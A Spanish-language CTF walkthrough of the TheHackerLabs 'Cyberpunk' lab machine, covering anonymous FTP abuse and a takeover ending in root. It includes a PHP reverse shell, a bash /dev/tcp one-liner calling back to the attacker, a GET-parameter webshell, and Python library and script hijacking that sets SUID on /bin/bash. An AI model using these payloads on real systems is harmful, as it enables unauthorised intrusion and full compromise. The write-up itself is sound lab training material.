---
title: "Cyberpunk - TheHackerLabs"
date: 2025-02-21
draft: false
slug: "THL-writeup-cyberpunk"
excerpt: "Una máquina sencilla, pero que tiene sus sorpresas. Analizando el escaneo de servicios, descubrimos algunos archivos del servicio FTP que dan a entender que utilizan este servicio como servidor web y que, además, podemos loguearnos en el servicio FTP como usuario anonymous. Dentro del FTP, subimos un archivo random y lo visualizamos en la página web, comprobando que todo lo que subamos al FTP, se verá representado en la página web. Aprovechamos esto, para subir un Reverse Shell de PHP con tal de obtener una sesión en la máquina víctima. Una vez conectados, descubrimos un archivo con un código extraño que resulto ser lenguaje Brainfuck. Decodificando ese código, descubrimos que es la contraseña de un usuario del servicio SSH. Ya dentro del SSH, encontramos un script de Python que convierte en base64 a cualquier texto y que se puede ejecutar como el usuario Root. Aprovechamos este script para aplicar Python Library Hijacking y Script Hijacking para escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Apache", "FTP", "FTP Enumeration", "Abusing File Upload", "PHP Reverse Shell", "Brainfuck Decoding", "Python Library Hijacking", "Script Hijacking", "Privesc - Python Library Hijacking", "Privesc - Script Hijacking", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "ftp"
  - "wget"
  - "nc"
  - "PHP"
  - "bash"
  - "ssh"
  - "sudo"
  - "python3"
  - "mv"
links:
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://md5decrypt.net/en/Brainfuck-translator/"
  - "https://deephacking.tech/path-hijacking-y-library-hijacking/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-cyberpunk/cyberpunk.webp"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.120
PING 192.168.1.120 (192.168.1.120) 56(84) bytes of data.
64 bytes from 192.168.1.120: icmp_seq=1 ttl=64 time=1.99 ms
64 bytes from 192.168.1.120: icmp_seq=2 ttl=64 time=0.966 ms
64 bytes from 192.168.1.120: icmp_seq=3 ttl=64 time=0.901 ms
64 bytes from 192.168.1.120: icmp_seq=4 ttl=64 time=0.811 ms

--- 192.168.1.120 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 0.811/1.167/1.993/0.479 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.120 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 11:54 CST
Initiating ARP Ping Scan at 11:54
Scanning 192.168.1.120 [1 port]
Completed ARP Ping Scan at 11:54, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:54
Scanning 192.168.1.120 [65535 ports]
Discovered open port 80/tcp on 192.168.1.120
Discovered open port 22/tcp on 192.168.1.120
Discovered open port 21/tcp on 192.168.1.120
Completed SYN Stealth Scan at 11:54, 6.33s elapsed (65535 total ports)
Nmap scan report for 192.168.1.120
Host is up, received arp-response (0.00096s latency).
Scanned at 2025-02-21 11:54:37 CST for 7s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos y me da curiosidad que tenga activo el **puerto 21** que es del **servicio FTP**, pues que yo sepa no es común, a menos que lo utilicen como un servidor web.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80 192.168.1.120 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-21 11:55 CST
Nmap scan report for 192.168.1.120
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x   2 0        0            4096 May  1  2024 images
| -rw-r--r--   1 0        0             713 May  1  2024 index.html
|_-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.120]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.120]
|     214-Se reconocen las siguiente 
|     rdenes (* =>'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@Cyberpunk
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.120]
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 6d:b5:c8:65:8d:1f:8a:98:76:93:26:27:df:29:72:4a (ECDSA)
|_  256 a5:83:2a:8f:eb:c6:f1:0b:e0:e6:d8:e1:05:3b:4c:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-title: Arasaka
|_http-server-header: Apache/2.4.59 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=2/21%Time=67B8BE03%P=x86_64-pc-linux-gnu%r(NULL
SF:,3A,"220\x20Servidor\x20ProFTPD\x20\(Cyberpunk\)\x20\[::ffff:192\.168\.
SF:1\.120\]\r\n")%r(GenericLines,9C,"220\x20Servidor\x20ProFTPD\x20\(Cybe
SF:rpunk\)\x20\[::ffff:192\.168\.1\.120\]\r\n500\x20Orden\x20incorrecta:\
SF:x20Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n500\x20Orden\x20incorrec
SF:ta:\x20Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n")%r(Help,27B,"220\x
SF:20Servidor\x20ProFTPD\x20\(Cyberpunk\)\x20\[::ffff:192\.168\.100\.31\]\
SF:r\n214-Se\x20reconocen\x20las\x20siguiente\x20\xc3\xb3rdenes\x20\(\*\x2
SF:0=>'s\x20no\x20implementadas\):\r\n\x20CWD\x20\x20\x20\x20\x20XCWD\x20\
SF:x20\x20\x20CDUP\x20\x20\x20\x20XCUP\x20\x20\x20\x20SMNT\*\x20\x20\x20QU
SF:IT\x20\x20\x20\x20PORT\x20\x20\x20\x20PASV\x20\x20\x20\x20\r\n\x20EPRT\
SF:x20\x20\x20\x20EPSV\x20\x20\x20\x20ALLO\x20\x20\x20\x20RNFR\x20\x20\x20
SF:\x20RNTO\x20\x20\x20\x20DELE\x20\x20\x20\x20MDTM\x20\x20\x20\x20RMD\x20
SF:\x20\x20\x20\x20\r\n\x20XRMD\x20\x20\x20\x20MKD\x20\x20\x20\x20\x20XMKD
SF:\x20\x20\x20\x20PWD\x20\x20\x20\x20\x20XPWD\x20\x20\x20\x20SIZE\x20\x20
SF:\x20\x20SYST\x20\x20\x20\x20HELP\x20\x20\x20\x20\r\n\x20NOOP\x20\x20\x2
SF:0\x20FEAT\x20\x20\x20\x20OPTS\x20\x20\x20\x20HOST\x20\x20\x20\x20CLNT\x
SF:20\x20\x20\x20AUTH\*\x20\x20\x20CCC\*\x20\x20\x20\x20CONF\*\x20\x20\x20
SF:\r\n\x20ENC\*\x20\x20\x20\x20MIC\*\x20\x20\x20\x20PBSZ\*\x20\x20\x20PRO
SF:T\*\x20\x20\x20TYPE\x20\x20\x20\x20STRU\x20\x20\x20\x20MODE\x20\x20\x20
SF:\x20RETR\x20\x20\x20\x20\r\n\x20STOR\x20\x20\x20\x20STOU\x20\x20\x20\x2
SF:0APPE\x20\x20\x20\x20REST\x20\x20\x20\x20ABOR\x20\x20\x20\x20RANG\x20\x
SF:20\x20\x20USER\x20\x20\x20\x20PASS\x20\x20\x20\x20\r\n\x20ACCT\*\x20\x2
SF:0\x20REIN\*\x20\x20\x20LIST\x20\x20\x20\x20NLST\x20\x20\x20\x20STAT\x20
SF:\x20\x20\x20SITE\x20\x20\x20\x20MLSD\x20\x20\x20\x20MLST\x20\x20\x20\x2
SF:0\r\n214\x20Env\xc3\xada\x20comentario\x20a\x20root@Cyberpunk\r\n")%r(S
SF:SLSessionReq,3A,"220\x20Servidor\x20ProFTPD\x20\(Cyberpunk\)\x20\[::fff
SF:f:192\.168\.1\.120\]\r\n")%r(SMBProgNeg,3A,"220\x20Servidor\x20ProFTPD
SF:\x20\(Cyberpunk\)\x20\[::ffff:192\.168\.1\.120\]\r\n");
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: Servidor; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.80 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, el escaneo acaba de mostrar que podemos loguearnos al **servicio FTP** como el usuario **anonymous** y de hecho, podemos ver algunos archivos que parecen ser de la página web activa.

Vamos a comprobarlo en la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura1.png">
</p>

Parece ser un personaje del videojuego **Cyberpunk 2077** (uno de mis favoritos).

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura2.png">
</p>

No nos dice mucho.

Recordemos que en el escaneo, pudimos ver algunos archivos que parecen ser de la página web.

Vamos a comprobarlo buscando uno de estos, en específico, buscaremos el archivo `secret.txt`:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura3.png">
</p>

Parece que sí, están usando el **servicio FTP** como servidor web. Ya con esto nos podemos dar una idea de lo que podemos hacer.

Pero, no está demás comprobarlo.

### Análisis y Enumeración de Servicio FTP {#FTP}

Entremos:
```bash
ftp 192.168.1.120
Connected to 192.168.1.120.
220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.120]
Name (192.168.1.120:berserkwings): anonymous
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Estamos dentro.

Revisamos y ahí están los archivos que vimos en el escaneo de servicios:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||16681|)
150 Abriendo conexión de datos en modo ASCII para file list
drwxr-xr-x   2 0        0            4096 May  1  2024 images
-rw-r--r--   1 0        0             713 May  1  2024 index.html
-rw-r--r--   1 0        0             923 May  1  2024 secret.txt
226 Transferencia completada
ftp>
```

Vamos a tratar de subir un archivo.

Crea un archivo de texto random:
```bash
nano prueba.txt
```

Y súbelo al **servicio FTP** utilizando el comando **put**:
```bash
ftp> put prueba.txt 
local: prueba.txt remote: prueba.txt
229 Entering Extended Passive Mode (|||37532|)
150 Abriendo conexión de datos en modo BINARY para prueba.txt
100% |************************************************|    22       21.74 KiB/s    00:00 ETA
226 Transferencia completada
22 bytes sent in 00:00 (6.86 KiB/s)
ftp>
```

Ahora, veamos si lo podemos ver en la página web:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura4.png">
</p>

Ahí está.

Entonces, la idea será subir un archivo que interprete el **servidor Apache**, que normalmente puede interpretar el **lenguaje PHP**, por lo que vamos a usar una **Reverse Shell de PHP** para obtener una sesión de la máquina víctima.

## Explotación de Vulnerabilidades {#Explotacion}

### Utilizando Reverse Shell de PHP de pentestmonkey para Obtener Sesión de la Máquina Víctima {#PHP}

Vamos a utilizar la **Reverse Shell** de **pentestmonkey**. 

La puedes obtener del siguiente link:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

La descargamos con **wget**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
--2025-02-21 12:15:51--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5.4K) [text/plain]
Grabando a: «php-reverse-shell.php»
.
php-reverse-shell.php        100%[===========================================>]   5.36K  --.-KB/s    en 0s      
.
2025-02-21 12:15:51 (83.2 MB/s) - «php-reverse-shell.php» guardado [5491/5491]
```

Para poder usarla, necesitamos modificar los campos de la IP y del puerto para poner nuestra IP y un puerto que queramos. 

El mismo script nos lo dice:
```php
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
```

Cambia esos dos datos y luego, súbelo al **servicio FTP**:
```bash
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||27786|)
150 Abriendo conexión de datos en modo BINARY para php-reverse-shell.php
100% |*****************************************************************|  5496       10.52 MiB/s    00:00 ETA
226 Transferencia completada
5496 bytes sent in 00:00 (2.29 MiB/s)
```

Bien, ahora abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y, vamos a visitar en la página web la **Reverse Shell** que cargamos en el **servicio FTP**.

Revisa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.120] 34088
Linux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 GNU/Linux
 19:17:56 up 25 min,  0 user,  load average: 2.45, 2.24, 1.47
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Listo, estamos dentro.

Ya solo haz un tratamiento de la **TTY** y tendrás una shell interactiva.

### Creando y Cargando Reverse Shell de PHP para Obtener Sesión de la Máquina Víctima {#PHP2}

Otra opción que pudimos haber hecho, sería crear nuestra propia **Reverse Shell**.

Esta sería la **Reverse Shell** que usaríamos:
```php
<?php
	system("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'");
?>
```

Vamos a subirlo al **servicio FTP**:
```bash
ftp> put revShell2.php 
local: revShell2.php remote: revShell2.php
229 Entering Extended Passive Mode (|||50390|)
150 Abriendo conexión de datos en modo BINARY para revShell2.php
100% |*********************************************************|   126        1.15 MiB/s    00:00 ETA
226 Transferencia completada
126 bytes sent in 00:00 (48.67 KiB/s)
```

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y, vamos a visitar en la página web la **Reverse Shell** que cargamos en el **servicio FTP**.

Revisa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.120] 46368
bash: cannot set terminal process group (487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Cyberpunk:/var/www/html$
```
Listo, otra vez estamos dentro.

### Creando y Utilizando WebShell de PHP para Obtener Sesión en Máquina Víctima {#PHP3}

Esto es bastante sencillo.

Vamos a crear un script de **PHP** que funcione como una **WebShell**:
```php
<?php
	system($_GET['cmd']);
?>
```

Lo cargamos al **servicio FTP**:
```bash
ftp> put cmd.php 
local: cmd.php remote: cmd.php
229 Entering Extended Passive Mode (|||6665|)
150 Abriendo conexión de datos en modo BINARY para cmd.php
100% |***************************************************|    32      322.16 KiB/s    00:00 ETA
226 Transferencia completada
32 bytes sent in 00:00 (5.98 KiB/s)
```

Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y, vamos a visitar en la página web la **Reverse Shell** que cargamos en el **servicio FTP**.

Desde la URL, vamos a usar el parámetro **cmd** para poder ejecutar comandos.

Intentemos ejecutar el comando **whoami**:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura5.png">
</p>

Funciona.

Ahora, vamos a utilizar nuestra **Reverse Shell**, pero **URL encodeada**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura6.png">
</p>

Revisa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.120] 46368
bash: cannot set terminal process group (487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Cyberpunk:/var/www/html$
```
Listo, volvimos a entrar a la máquina.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#LinEnum}

Como el **usuario www-data** no podremos hacer mucho, pues tampoco podremos ver el directorio del **usuario arasaka**.

Investigando un poco, podemos encontrar un archivo dentro del directorio `/opt`:
```bash
www-data@Cyberpunk:/home$ ls /opt
arasaka.txt
```

Al ver su contenido, vemos algo extraño:
```bash
www-data@Cyberpunk:/opt$ cat arasaka.txt 
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```

Investigando este código, descubrimos que se trata de **lenguaje Brainfuck**:

| **Lenguaje Brainfuck** |
|:-----------:|
| *Brainfuck es un lenguaje de programación minimalista y es conocido por su sintaxis extremadamente simple y su capacidad de realizar tareas complejas con una estructura de comandos muy limitada. Los comandos de Brainfuck son símbolos de un solo carácter y cada uno realiza una operación diferente sobre un cinta de memoria (una especie de arreglo de celdas de datos).* |

Podemos encontrar una página que puede decodificar este lenguaje:
* <a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Brainfuck Translator</a>

Vamos a copiar y a pegar el código que encontramos.

Veamos que puede ser:

<p align="center">
<img src="/assets/images/THL-writeup-cyberpunk/Captura7.png">
</p>

Parece ser una contraseña.

Vamos a comprobarlo utilizando al **usuario arasaka**:
```bash
ssh arasaka@192.168.1.120
arasaka@192.168.1.120's password: 
Linux Cyberpunk 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
.
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 21 20:31:20 2025
arasaka@Cyberpunk:~$ whoami
arasaka
```
Estamos dentro.

### Aplicando Python Library Hijacking para Escalar Privilegios {#Hijacking}

Si revisamos el contenido del **usuario arasaka**, aparte de encontrar la flag del usuario, podemos encontrar un script:
```bash
arasaka@Cyberpunk:~$ ls
randombase64.py  user.txt
arasaka@Cyberpunk:~$ cat user.txt
...
```

Revisando nuestros privilegios, resulta que podemos ejecutar este script como el **Root**:
```bash
arasaka@Cyberpunk:~$ sudo -l
[sudo] contraseña para arasaka: 
Matching Defaults entries for arasaka on Cyberpunk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User arasaka may run the following commands on Cyberpunk:
    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

Analizando este script, nos damos cuenta de que solamente **codifica en base64** cualquier texto que le des:
```bash
arasaka@Cyberpunk:~$ cat randombase64.py 
import base64
message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")
.
print(base64_message)
arasaka@Cyberpunk:~$ python3 randombase64.py 
Enter your stringpapu
cGFwdQ==
```

Sabiendo esto, es claro que podemos intentar aplicar **Python Library Hijacking**.

Para hacerlo, necesitamos conocer si el script está utilizando el directorio actual para buscar módulos que necesite usar.

Esto lo podemos saber si obtenemos los paths de las librerías actuales que utiliza **Python**:
```bash
arasaka@Cyberpunk:~$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python311.zip', '/usr/lib/python3.11', '/usr/lib/python3.11/lib-dynload', '/usr/local/lib/python3.11/dist-packages', '/usr/lib/python3/dist-packages']
```
Ahí está, este directorio sí está siendo utilizado por el script.

Ahora, necesitamos conocer el binario que está ocupando la **librería base64** del script:
```bash
arasaka@Cyberpunk:~$ python3 -c "import base64; print(base64.__file__)"
/usr/lib/python3.11/base64.py
```
Lo tenemos, se llama `base64.py`.

Tan solo tenemos que crear un script que cambie los permisos de la **Bash** para que tenga **permisos SUID**.

El script debe tener el mismo nombre del binario a suplantar:
```python
import os
os.system("chmod u+s /bin/bash")
```

Revisa los permisos de la **Bash**:
```bash
arasaka@Cyberpunk:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

Ya solamente, ejecutamos el script `randombase64.py` como **Root**:
```bash
arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
Enter your string hackeado   
Traceback (most recent call last):
  File "/home/arasaka/randombase64.py", line 4, in <module>
    base64_bytes = base64.b64encode(message_bytes)
                   ^^^^^^^^^^^^^^^^
AttributeError: module 'base64' has no attribute 'b64encode'
```
Observa como falla el script al no funcionar la **librería base64** real.

Comprobamos los permisos de la **Bash**:
```bash
arasaka@Cyberpunk:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Funciono.

Y ejecutamos la **Bash** como **Root**:
```bash
arasaka@Cyberpunk:~$ bash -p
bash-5.2# whoami
root
```
Listo, ya somos **Root**.

### Aplicando Script Hijacking para Escalar Privilegios {#Hijacking2}

¿De qué se trata esto?

| **Script Hijacking** |
|:-----------:|
| *Script Hijacking es un tipo de ataque en el que un atacante sustituye, modifica o redirige un script legítimo en un sistema para ejecutar código malicioso o no autorizado. Esto puede ocurrir en varios contextos, pero se basa en el principio de que el script legítimo se ejecuta con privilegios elevados o en un entorno donde se le confía su ejecución.* |

La idea es, que como este script está dentro del directorio del **usuario arasaka**, este usuario puede tener la capacidad de renombrar, mover o eliminar este script, solamente no puede modificarlo porque el dueño es el **usuario Root**.

Vamos a comprobarlo, tratando de renombrar el script:
```bash
arasaka@Cyberpunk:~$ mv randombase64.py nada.py
arasaka@Cyberpunk:~$ ls
nada.py  __pycache__  user.txt
```
Sí se pudo.

Ahora podemos crear el mismo script, pero agregaremos la **librería os** y la instrucción para cambiar los permisos de la **Bash**:

```python
import base64
import os

message = input("Enter your string: ")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")

print(base64_message)

os.system("chmod u+s /bin/bash")
```

Revisa los permisos de la **Bash**:
```bash
arasaka@Cyberpunk:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```

Excelente, vamos a ejecutarlo como el **usuario Root**:
```bash
arasaka@Cyberpunk:~$ sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
[sudo] contraseña para arasaka: 
Enter your string: hackeado
aGFja2VhZG8=
```
Funciona, no hubo un problema en la ejecución.

Veamos los permisos de la **Bash**:
```bash
arasaka@Cyberpunk:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Excelente, realmente funciono.

Ya solo ejecutamos la **Bash** como **Root**:
```bash
arasaka@Cyberpunk:~$ bash -p
bash-5.2# whoami
root
```
Listo, ya somos **Root**.

Ya solo buscamos la flag del **Root**:

```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt 
**************

Enhorabuena, has podido desactivar el relic y salvar la vida de V.

La transferencia de eddies a tu cuenta se ha mandado :D
```
Con esto completamos la máquina y nos ganamos unos eddies jeje.
